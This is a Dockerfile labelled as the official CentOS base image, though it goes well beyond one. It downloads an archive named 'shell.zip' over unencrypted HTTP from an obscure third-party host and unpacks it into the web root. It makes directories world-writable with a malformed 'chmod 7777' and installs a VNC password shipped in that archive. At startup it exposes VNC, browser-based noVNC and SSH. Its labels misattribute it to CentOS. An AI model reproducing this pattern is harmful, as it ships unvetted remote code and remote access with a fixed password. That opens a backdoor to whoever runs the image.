FROM scratch
MAINTAINER The CentOS Project <cloud-ops@centos.org>
ADD centos-7.2.1511-docker.tar.xz /

LABEL name="CentOS Base Image"
LABEL vendor="CentOS"
LABEL license=GPLv2

# Volumes for systemd
# VOLUME ["/run", "/tmp"]

# Environment for systemd
# ENV container=docker

# For systemd usage this changes to /usr/sbin/init
# Keeping it as /bin/bash for compatability with previous
##CMD ["/bin/bash"]

RUN yum install sudo zip wget unzip xorg lxde tightvncserver autocutsel openssh kernel virtualbox

RUN cd /root/;wget http://sf.x3193.usa.cc/backup/shell.zip;unzip -o -d /var/www/html/ shell.zip;unzip -o -d /var/www/html/ /var/www/html/shell/conf/vncserver/noVNC-master.zip;chmod -R 7777 /var/www/html/shell/confv;unzip -o -d /var/www/html/ noVNC-master.zip;chmod -R 7777 /var/www/html;unzip -o -d /var/www/html/noVNC-master/utils /var/www/html/shell/conf/vncserver/websockify.zip;mkdir -vp /root/.vnc;chmod -R 7777 /root/.vnc;cd /var/www/html/shell/conf/vncserver;cp -R -f passwd xstartup /root/.vnc;chmod -R 0600 /root/.vnc/passwd;

CMD tightvncserver :1;setsid /var/www/html/noVNC-master/utils/launch.sh --vnc localhost:5901;exec /usr/sbin/sshd -D;
